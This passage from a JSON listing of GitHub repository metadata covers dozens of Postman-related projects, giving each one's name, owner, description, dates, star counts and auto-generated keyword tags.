Postman","fork":false,"created_at":"2016-04-28T13:49:22Z","updated_at":"2016-04-28T13:51:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1374775,"owner_login":"IPWright83","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1374775?v=4","pulled":1,"tags":["test","tests","tests ","within","creation","style","mine"]},{"id":217917355,"name":"postman-tester","full_name":"nobitagit/postman-tester","description":"Repo to test Postman environments and variables","fork":false,"created_at":"2019-10-27T21:13:07Z","updated_at":"2019-10-31T10:26:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2051152,"owner_login":"nobitagit","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2051152?v=4","pulled":1,"tags":["test","environment","environments","variable","variables"]},{"id":88403155,"name":"postman_helper","full_name":"guvkon/postman_helper","description":"Tool which adds some helpful functions to test JSON responses in Postman/Newman.","fork":false,"created_at":"2017-04-16T09:20:59Z","updated_at":"2017-04-21T09:43:03Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":2995141,"owner_login":"guvkon","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2995141?v=4","pulled":1,"tags":["test","help","function","response","responses","functions","helpful","adds"]},{"id":91324987,"name":"postman-extra","full_name":"pencilkill/postman-extra","description":null,"fork":false,"created_at":"2017-05-15T10:23:01Z","updated_at":"2017-05-15T10:24:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3848584,"owner_login":"pencilkill","owner_avatar_url":"https://avatars1.githubusercontent.com/u/3848584?v=4","pulled":1,"tags":[]},{"id":65578931,"name":"NodePostman","full_name":"havingfun2/NodePostman","description":null,"fork":false,"created_at":"2016-08-12T19:38:04Z","updated_at":"2016-08-12T19:40:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10158215,"owner_login":"havingfun2","owner_avatar_url":"https://avatars3.githubusercontent.com/u/10158215?v=4","pulled":1,"tags":[]},{"id":129975806,"name":"cognito-postman","full_name":"elvece/cognito-postman","description":null,"fork":false,"created_at":"2018-04-17T23:19:31Z","updated_at":"2018-10-25T16:12:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12953208,"owner_login":"elvece","owner_avatar_url":"https://avatars0.githubusercontent.com/u/12953208?v=4","pulled":1,"tags":[]},{"id":148787205,"name":"scripts-postman","full_name":"weverton-silva/scripts-postman","description":null,"fork":false,"created_at":"2018-09-14T12:45:21Z","updated_at":"2018-09-14T12:59:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39055891,"owner_login":"weverton-silva","owner_avatar_url":"https://avatars1.githubusercontent.com/u/39055891?v=4","pulled":1,"tags":[]},{"id":123114991,"name":"Postman-Integration","full_name":"sujayvenaik/Postman-Integration","description":null,"fork":false,"created_at":"2018-02-27T10:45:16Z","updated_at":"2018-04-18T06:19:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11532114,"owner_login":"sujayvenaik","owner_avatar_url":"https://avatars2.githubusercontent.com/u/11532114?v=4","pulled":1,"tags":[]},{"id":175247996,"name":"Postman_Friend","full_name":"samjones310/Postman_Friend","description":null,"fork":false,"created_at":"2019-03-12T15:55:32Z","updated_at":"2019-03-13T06:00:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33936224,"owner_login":"samjones310","owner_avatar_url":"https://avatars3.githubusercontent.com/u/33936224?v=4","pulled":1,"tags":[]},{"id":183025789,"name":"Postman-USG","full_name":"johntenezaca7/Postman-USG","description":"Using Postman's Newman and Jenkins to create a monitoring system for an automated testing suite.","fork":false,"created_at":"2019-04-23T13:53:00Z","updated_at":"2019-05-02T18:57:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28611728,"owner_login":"johntenezaca7","owner_avatar_url":"https://avatars0.githubusercontent.com/u/28611728?v=4","pulled":1,"tags":["test","create","testing","auto","automat","system","automate","automated","monitor","suite","monitoring"]},{"id":174174657,"name":"postman-api","full_name":"WondrousSquirrel/postman-api","description":null,"fork":false,"created_at":"2019-03-06T15:52:03Z","updated_at":"2019-03-07T16:12:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18142093,"owner_login":"WondrousSquirrel","owner_avatar_url":"https://avatars1.githubusercontent.com/u/18142093?v=4","pulled":1,"tags":[]},{"id":25633634,"name":"sendcloud-postman","full_name":"allmonday/sendcloud-postman","description":null,"fork":false,"created_at":"2014-10-23T11:28:28Z","updated_at":"2014-10-24T08:04:52Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":2917822,"owner_login":"allmonday","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2917822?v=4","pulled":1,"tags":[]},{"id":117375939,"name":"postman-runner","full_name":"coatsnmore/postman-runner","description":"Opinionated Postman Collection Runner for advanced API testing","fork":false,"created_at":"2018-01-13T20:30:07Z","updated_at":"2018-04-28T10:06:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2763721,"owner_login":"coatsnmore","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2763721?v=4","pulled":1,"tags":["test","testing","advance","advanced"]},{"id":143575014,"name":"postman-integration","full_name":"rodrigosenger/postman-integration","description":null,"fork":false,"created_at":"2018-08-05T01:35:58Z","updated_at":"2018-11-07T12:31:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10156623,"owner_login":"rodrigosenger","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10156623?v=4","pulled":1,"tags":[]},{"id":200875528,"name":"Postman_Redline","full_name":"w100frt/Postman_Redline","description":null,"fork":false,"created_at":"2019-08-06T15:12:10Z","updated_at":"2019-08-06T15:18:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41997349,"owner_login":"w100frt","owner_avatar_url":"https://avatars1.githubusercontent.com/u/41997349?v=4","pulled":1,"tags":[]},{"id":161302850,"name":"POSTMAN_interface","full_name":"ChalmersRobotPostman/POSTMAN_interface","description":null,"fork":false,"created_at":"2018-12-11T08:35:39Z","updated_at":"2018-12-11T08:37:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45686768,"owner_login":"ChalmersRobotPostman","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45686768?v=4","pulled":1,"tags":[]},{"id":234312819,"name":"CRUD-Postman","full_name":"Sarveshjhanwar/CRUD-Postman","description":null,"fork":false,"created_at":"2020-01-16T12:14:25Z","updated_at":"2020-01-17T07:26:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47262165,"owner_login":"Sarveshjhanwar","owner_avatar_url":"https://avatars3.githubusercontent.com/u/47262165?v=4","pulled":1,"tags":[]},{"id":244882311,"name":"LAB-postman","full_name":"todztor1984/LAB-postman","description":null,"fork":false,"created_at":"2020-03-04T11:23:40Z","updated_at":"2020-03-04T11:31:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":52730803,"owner_login":"todztor1984","owner_avatar_url":"https://avatars2.githubusercontent.com/u/52730803?v=4","pulled":1,"tags":[]},{"id":239475694,"name":"postman-blog","full_name":"postmanlabs/postman-blog","description":null,"fork":false,"created_at":"2020-02-10T09:41:00Z","updated_at":"2020-03-20T17:30:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10251060,"owner_login":"postmanlabs","owner_avatar_url":"https://avatars2.githubusercontent.com/u/10251060?v=4","pulled":1,"tags":[]},{"id":1434820,"name":"postman-splash","full_name":"obeattie/postman-splash","description":null,"fork":false,"created_at":"2011-03-03T12:10:25Z","updated_at":"2013-10-13T16:25:35Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":5988,"owner_login":"obeattie","owner_avatar_url":"https://avatars2.githubusercontent.com/u/5988?v=4","pulled":1,"tags":[]},{"id":80216622,"name":"MeetupPostman","full_name":"jhenaoz/MeetupPostman","description":null,"fork":false,"created_at":"2017-01-27T15:00:41Z","updated_at":"2017-01-27T15:00:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2055110,"owner_login":"jhenaoz","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2055110?v=4","pulled":1,"tags":[]},{"id":73812889,"name":"plugin-postman","full_name":"redline13/plugin-postman","description":null,"fork":false,"created_at":"2016-11-15T12:46:01Z","updated_at":"2018-10-10T07:58:24Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":3903698,"owner_login":"redline13","owner_avatar_url":"https://avatars0.githubusercontent.com/u/3903698?v=4","pulled":1,"tags":[]},{"id":152119863,"name":"postman-tests","full_name":"antonioortegajr/postman-tests","description":"I like writing tests in postman for my collections. This repo is generic examples of these tests for mostly my own reference.","fork":false,"created_at":"2018-10-08T17:33:00Z","updated_at":"2018-10-08T17:34:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6744175,"owner_login":"antonioortegajr","owner_avatar_url":"https://avatars3.githubusercontent.com/u/6744175?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","repo","tests","tests ","example","examples","reference","writing","generic","mostly"]},{"id":132895455,"name":"postman-scripts","full_name":"ahmedramez/postman-scripts","description":null,"fork":false,"created_at":"2018-05-10T12:11:55Z","updated_at":"2018-05-10T12:20:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25851356,"owner_login":"ahmedramez","owner_avatar_url":"https://avatars2.githubusercontent.com/u/25851356?v=4","pulled":1,"tags":[]},{"id":197611822,"name":"postman-runner","full_name":"flaviostutz/postman-runner","description":"Container with tools for running Postman scripts for integration tests on local or CI environments","fork":false,"created_at":"2019-07-18T15:20:30Z","updated_at":"2019-07-21T00:54:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7790172,"owner_login":"flaviostutz","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7790172?v=4","pulled":1,"tags":["test","tests","script","tool","tests ","environment","scripts","local","integration","running","tools","environments"]},{"id":185625797,"name":"postman_asserts","full_name":"AlexNDRmac/postman_asserts","description":"Tiny scripts for Postman Auto tests (reusable Assertions for postman tests and json schema validation)","fork":false,"created_at":"2019-05-08T14:47:19Z","updated_at":"2020-03-15T20:09:54Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":29776808,"owner_login":"AlexNDRmac","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29776808?v=4","pulled":1,"tags":["test"," postman","tests","script","tests ","json","scripts","postman tests","schema","validation","usable","reusable"]},{"id":249354856,"name":"gsoc_postman","full_name":"guptayogansh/gsoc_postman","description":null,"fork":false,"created_at":"2020-03-23T06:41:39Z","updated_at":"2020-03-24T10:30:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43352644,"owner_login":"guptayogansh","owner_avatar_url":"https://avatars3.githubusercontent.com/u/43352644?v=4","pulled":1,"tags":[]},{"id":250875729,"name":"postman-demo","full_name":"Hitvardhan-Singh-Solanki/postman-demo","description":null,"fork":false,"created_at":"2020-03-28T19:22:50Z","updated_at":"2020-03-29T15:10:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15267798,"owner_login":"Hitvardhan-Singh-Solanki","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15267798?v=4","pulled":1,"tags":[]},{"id":199376247,"name":"WebApiTests","full_name":"danielplawgo/WebApiTests","description":"Postman - asserty w automatycznych testach","fork":false,"created_at":"2019-07-29T04:08:40Z","updated_at":"2019-10-28T04:59:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":70243,"owner_login":"danielplawgo","owner_avatar_url":"https://avatars0.githubusercontent.com/u/70243?v=4","pulled":1,"tags":["test","auto","automat","assert","asserty"]},{"id":114694664,"name":"Postman-Fundamentals","full_name":"gsivaprabu/Postman-Fundamentals","description":"Postman is used by over 3 million developers across the world. This course will show you the fundamentals of Postman, how you can issue requests, create automated API tests, and even document your API with Postman.","fork":false,"created_at":"2017-12-18T22:38:26Z","updated_at":"2017-12-20T04:06:05Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":2444608,"owner_login":"gsivaprabu","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2444608?v=4","pulled":1,"tags":["test","create","request","tests","requests","develop","document","auto","automat","course","developer","automate","automated","developers","world","issue","fundamental","fundamentals","across","million"]},{"id":124187831,"name":"postman-integration","full_name":"whiz-Tuhin/postman-integration","description":"tests for reverse integrations","fork":false,"created_at":"2018-03-07T06:08:49Z","updated_at":"2018-04-26T13:14:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15214065,"owner_login":"whiz-Tuhin","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15214065?v=4","pulled":1,"tags":["test","tests","tests ","integration","ever","reverse"]},{"id":165844992,"name":"PostMany","full_name":"SilmyAhamed/PostMany","description":null,"fork":false,"created_at":"2019-01-15T12:11:48Z","updated_at":"2019-07-16T11:49:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39452441,"owner_login":"SilmyAhamed","owner_avatar_url":"https://avatars0.githubusercontent.com/u/39452441?v=4","pulled":1,"tags":[]},{"id":203227286,"name":"Postman_Github","full_name":"daspedras1/Postman_Github","description":null,"fork":false,"created_at":"2019-08-19T18:26:29Z","updated_at":"2019-08-20T13:51:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45322141,"owner_login":"daspedras1","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45322141?v=4","pulled":1,"tags":[]},{"id":214703433,"name":"supertest-postman","full_name":"AndrewKeig/supertest-postman","description":"This project will take a postman collection v2 file and generate supertest tests.","fork":false,"created_at":"2019-10-12T19:27:49Z","updated_at":"2020-02-22T22:00:08Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":62837,"owner_login":"AndrewKeig","owner_avatar_url":"https://avatars0.githubusercontent.com/u/62837?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","file","tests","generate","super","supertest"]},{"id":130575711,"name":"open-library-api-newman","full_name":"cristianestrellax6/open-library-api-newman","description":"api test with postman + newman","fork":false,"created_at":"2018-04-22T14:34:09Z","updated_at":"2018-05-03T21:22:37Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":38596530,"owner_login":"cristianestrellax6","owner_avatar_url":"https://avatars0.githubusercontent.com/u/38596530?v=4","pulled":1,"tags":["test"," postman","newman"]},{"id":83190724,"name":"nodejs-postman","full_name":"ValerioSevilla/nodejs-postman","description":"Example of a Node.js server exposing a simple REST API and tests for that API using Postman","fork":false,"created_at":"2017-02-26T07:20:10Z","updated_at":"2018-01-14T12:12:23Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":614661,"owner_login":"ValerioSevilla","owner_avatar_url":"https://avatars2.githubusercontent.com/u/614661?v=4","pulled":1,"tags":["test","tests","server","tests ","exposing"]},{"id":116638921,"name":"postman-Learning","full_name":"divyaaa1812/postman-Learning","description":null,"fork":false,"created_at":"2018-01-08T06:30:13Z","updated_at":"2018-01-08T06:30:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35126910,"owner_login":"divyaaa1812","owner_avatar_url":"https://avatars3.githubusercontent.com/u/35126910?v=4","pulled":1,"tags":[]},{"id":169819235,"name":"postman-app","full_name":"prominentmajesty/postman-app","description":null,"fork":false,"created_at":"2019-02-09T01:05:09Z","updated_at":"2019-02-09T01:07:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39302159,"owner_login":"prominentmajesty","owner_avatar_url":"https://avatars1.githubusercontent.com/u/39302159?v=4","pulled":1,"tags":[]},{"id":81978143,"name":"postman-tests-framework","full_name":"ForEvolve/postman-tests-framework","description":"[obsolete] A Postman test framework","fork":false,"created_at":"2017-02-14T18:51:05Z","updated_at":"2018-04-30T02:30:00Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":16228507,"owner_login":"ForEvolve","owner_avatar_url":"https://avatars1.githubusercontent.com/u/16228507?v=4","pulled":1,"tags":["test","framework","obsolete"]},{"id":113273443,"name":"ARCHIVED-simple_http_postman","full_name":"XccelerateOrg/ARCHIVED-simple_http_postman","description":"Simple HTTP for testing Postman","fork":false,"created_at":"2017-12-06T05:34:04Z","updated_at":"2018-01-17T09:33:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24907171,"owner_login":"XccelerateOrg","owner_avatar_url":"https://avatars2.githubusercontent.com/u/24907171?v=4","pulled":1,"tags":["test","testing"]},{"id":188857378,"name":"testeCollectionPostman","full_name":"filipesilvazup/testeCollectionPostman","description":"testeCollection","fork":false,"created_at":"2019-05-27T14:21:32Z","updated_at":"2019-05-27T18:21:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42280872,"owner_login":"filipesilvazup","owner_avatar_url":"https://avatars0.githubusercontent.com/u/42280872?v=4","pulled":1,"tags":["test"]},{"id":177233854,"name":"cookies-test-header-postman","full_name":"treygithub/cookies-test-header-postman","description":"testing header and cookies postman style chia librarry","fork":false,"created_at":"2019-03-23T02:18:14Z","updated_at":"2019-03-23T02:21:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33182842,"owner_login":"treygithub","owner_avatar_url":"https://avatars3.githubusercontent.com/u/33182842?v=4","pulled":1,"tags":["test"," postman","testing","header","style","cookies"]},{"id":194604642,"name":"postman-vm-package-injector","full_name":"jerowang/postman-vm-package-injector","description":null,"fork":false,"created_at":"2019-07-01T05:20:59Z","updated_at":"2019-07-11T04:59:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16468982,"owner_login":"jerowang","owner_avatar_url":"https://avatars3.githubusercontent.com/u/16468982?v=4","pulled":1,"tags":[]},{"id":166793480,"name":"medium-postman-testing","full_name":"bornfight/medium-postman-testing","description":null,"fork":false,"created_at":"2019-01-21T10:17:54Z","updated_at":"2019-01-30T09:59:48Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":3583407,"owner_login":"bornfight","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3583407?v=4","pulled":1,"tags":[]},{"id":246356616,"name":"PostManHelper","full_name":"tsudodog/PostManHelper","description":null,"fork":false,"created_at":"2020-03-10T16:49:08Z","updated_at":"2020-03-10T17:37:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29548050,"owner_login":"tsudodog","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29548050?v=4","pulled":1,"tags":[]},{"id":158230377,"name":"postman-api-request-executor","full_name":"KevinWingi/postman-api-request-executor","description":"Javascript code to run tests repeatedly in POSTMAN","fork":false,"created_at":"2018-11-19T13:45:38Z","updated_at":"2018-11-19T14:25:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16369534,"owner_login":"KevinWingi","owner_avatar_url":"https://avatars3.githubusercontent.com/u/16369534?v=4","pulled":1,"tags":["test","tests","script","tests ","code","repeatedly"]},{"id":219755270,"name":"postman-routing-exercise","full_name":"ncoughlin/postman-routing-exercise","description":"Bootcamp Express App testing routing and testing with Postman","fork":false,"created_at":"2019-11-05T13:45:13Z","updated_at":"2019-11-07T19:20:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3167700,"owner_login":"ncoughlin","owner_avatar_url":"https://avatars1.githubusercontent.com/u/3167700?v=4","pulled":1,"tags":["test","testing","routing"]},{"id":90442793,"name":"node-postman-docs","full_name":"ryanc16/node-postman-docs","description":"Utility to convert Postman tests in json to markdown","fork":false,"created_at":"2017-05-06T06:38:20Z","updated_at":"2017-05-06T06:44:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11671601,"owner_login":"ryanc16","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11671601?v=4","pulled":1,"tags":["test","tests","tests ","json","convert","markdown"]},{"id":51917113,"name":"data-driven-postman","full_name":"multimac/data-driven-postman","description":"A series of scripts for running data-driven tests using Postman","fork":false,"created_at":"2016-02-17T11:17:29Z","updated_at":"2016-02-17T11:32:50Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":354845,"owner_login":"multimac","owner_avatar_url":"https://avatars0.githubusercontent.com/u/354845?v=4","pulled":1,"tags":["test","data","tests","script","tests ","scripts","running","drive","driven","series"]},{"id":49665543,"name":"mr-postman-v1","full_name":"CarlosAGG/mr-postman-v1","description":null,"fork":false,"created_at":"2016-01-14T18:11:30Z","updated_at":"2016-01-14T18:11:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11427516,"owner_login":"CarlosAGG","owner_avatar_url":"https://avatars0.githubusercontent.com/u/11427516?v=4","pulled":1,"tags":[]},{"id":102279399,"name":"bak-postman-rest-client","full_name":"boxcore/bak-postman-rest-client","description":null,"fork":false,"created_at":"2017-09-03T16:48:30Z","updated_at":"2017-09-03T16:50:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4996138,"owner_login":"boxcore","owner_avatar_url":"https://avatars0.githubusercontent.com/u/4996138?v=4","pulled":1,"tags":[]},{"id":176676111,"name":"cgi-trello-postman","full_name":"KRatnaprabha/cgi-trello-postman","description":null,"fork":false,"created_at":"2019-03-20T07:14:17Z","updated_at":"2019-03-20T07:29:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48748045,"owner_login":"KRatnaprabha","owner_avatar_url":"https://avatars0.githubusercontent.com/u/48748045?v=4","pulled":1,"tags":[]},{"id":193211940,"name":"postman-web-ui","full_name":"kk-sarkar/postman-web-ui","description":null,"fork":false,"created_at":"2019-06-22T08:44:25Z","updated_at":"2019-06-22T12:51:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34937125,"owner_login":"kk-sarkar","owner_avatar_url":"https://avatars3.githubusercontent.com/u/34937125?v=4","pulled":1,"tags":[]},{"id":194559431,"name":"postman_issue6337_demo","full_name":"thesaxonedone/postman_issue6337_demo","description":null,"fork":false,"created_at":"2019-06-30T20:41:27Z","updated_at":"2019-06-30T22:11:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31674706,"owner_login":"thesaxonedone","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31674706?v=4","pulled":1,"tags":[]},{"id":131689759,"name":"ost-postman-script","full_name":"hammadtq/ost-postman-script","description":"A pre-request script to help test the OST Developer API","fork":false,"created_at":"2018-05-01T08:04:10Z","updated_at":"2018-05-03T11:02:21Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":11869286,"owner_login":"hammadtq","owner_avatar_url":"https://avatars2.githubusercontent.com/u/11869286?v=4","pulled":1,"tags":["test","request","script","help"]},{"id":196874438,"name":"concourse-postman-resource","full_name":"atzawada/concourse-postman-resource","description":"Concourse resource to run postman test suites.","fork":false,"created_at":"2019-07-14T19:19:09Z","updated_at":"2019-08-13T23:10:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32112934,"owner_login":"atzawada","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32112934?v=4","pulled":1,"tags":["test"," postman","source","course","resource","suite","test suite"]},{"id":225569876,"name":"swagger1-to-postman","full_name":"postmanlabs/swagger1-to-postman","description":null,"fork":false,"created_at":"2019-12-03T08:36:27Z","updated_at":"2019-12-09T11:39:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10251060,"owner_login":"postmanlabs","owner_avatar_url":"https://avatars2.githubusercontent.com/u/10251060?v=4","pulled":1,"tags":[]},{"id":228789243,"name":"smart_house_postman","full_name":"Torvictor/smart_house_postman","description":"For testing API of smart house","fork":false,"created_at":"2019-12-18T08:04:32Z","updated_at":"2020-01-14T05:48:11Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":38391733,"owner_login":"Torvictor","owner_avatar_url":"https://avatars3.githubusercontent.com/u/38391733?v=4","pulled":1,"tags":["test","testing","smart"]},{"id":185835993,"name":"postman-to-load","full_name":"jedlee2004/postman-to-load","description":"Tool to convert postman collections into load tests options and run them with the npm loadtest package","fork":false,"created_at":"2019-05-09T16:34:41Z","updated_at":"2019-09-24T16:39:19Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":8194654,"owner_login":"jedlee2004","owner_avatar_url":"https://avatars0.githubusercontent.com/u/8194654?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","postman collection","tests","tests ","convert","postman collections","load","package","options"]},{"id":189011114,"name":"Postman_Friend_PHP","full_name":"samjones310/Postman_Friend_PHP","description":null,"fork":false,"created_at":"2019-05-28T10:59:43Z","updated_at":"2019-05-30T08:11:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33936224,"owner_login":"samjones310","owner_avatar_url":"https://avatars3.githubusercontent.com/u/33936224?v=4","pulled":1,"tags":[]},{"id":139285883,"name":"tech5","full_name":"cos1715/tech5","description":"NodeJS Server and test via Postman ","fork":false,"created_at":"2018-06-30T22:57:19Z","updated_at":"2019-08-06T13:12:50Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32968019,"owner_login":"cos1715","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32968019?v=4","pulled":1,"tags":["test"]},{"id":139853031,"name":"REST_APIS","full_name":"Kahoza/REST_APIS","description":"rest apis to be test with Postman ","fork":false,"created_at":"2018-07-05T13:23:46Z","updated_at":"2019-01-25T13:26:28Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":31520524,"owner_login":"Kahoza","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31520524?v=4","pulled":1,"tags":["test","rest","rest api"]},{"id":189246238,"name":"simpleREST","full_name":"HananNayberg/simpleREST","description":"nodeJS REST app to test Postman","fork":false,"created_at":"2019-05-29T14:53:12Z","updated_at":"2019-06-03T18:50:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35271504,"owner_login":"HananNayberg","owner_avatar_url":"https://avatars3.githubusercontent.com/u/35271504?v=4","pulled":1,"tags":["test","node"]},{"id":220478038,"name":"newman-javascript","full_name":"nand1234/newman-javascript","description":"problematically postman test script execution using Newman","fork":false,"created_at":"2019-11-08T13:59:15Z","updated_at":"2019-11-12T13:04:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31034303,"owner_login":"nand1234","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31034303?v=4","pulled":1,"tags":["test"," postman","script","call","problem","execution","problematically"]},{"id":47413568,"name":"GrandCircus-Working-With-Postman","full_name":"basskee/GrandCircus-Working-With-Postman","description":"This is a simple Express.js API created to test the functionality of POSTMAN for Chrome","fork":false,"created_at":"2015-12-04T15:54:35Z","updated_at":"2015-12-21T15:13:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11934996,"owner_login":"basskee","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11934996?v=4","pulled":1,"tags":["test","create","function","functional","functionality"]},{"id":135495395,"name":"node-postman-newman-jenkins-sample","full_name":"scheung38/node-postman-newman-jenkins-sample","description":null,"fork":false,"created_at":"2018-05-30T20:41:00Z","updated_at":"2018-05-30T21:13:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1273014,"owner_login":"scheung38","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1273014?v=4","pulled":1,"tags":[]},{"id":206417877,"name":"nodejs-upload-file","full_name":"salesh/nodejs-upload-file","description":"Postman upload file txt/pdf test","fork":false,"created_at":"2019-09-04T21:30:58Z","updated_at":"2020-02-09T19:46:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3098030,"owner_login":"salesh","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3098030?v=4","pulled":1,"tags":["test","file","load","upload"]},{"id":149392657,"name":"MongoDB-NodeJS-Postman","full_name":"rahul-tiwari-95/MongoDB-NodeJS-Postman","description":null,"fork":false,"created_at":"2018-09-19T04:32:41Z","updated_at":"2018-09-19T04:33:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42743946,"owner_login":"rahul-tiwari-95","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42743946?v=4","pulled":1,"tags":[]},{"id":61844441,"name":"CRUD-operations-using-Node.js-Express","full_name":"manishatan/CRUD-operations-using-Node.js-Express","description":"You may use Postman to test. 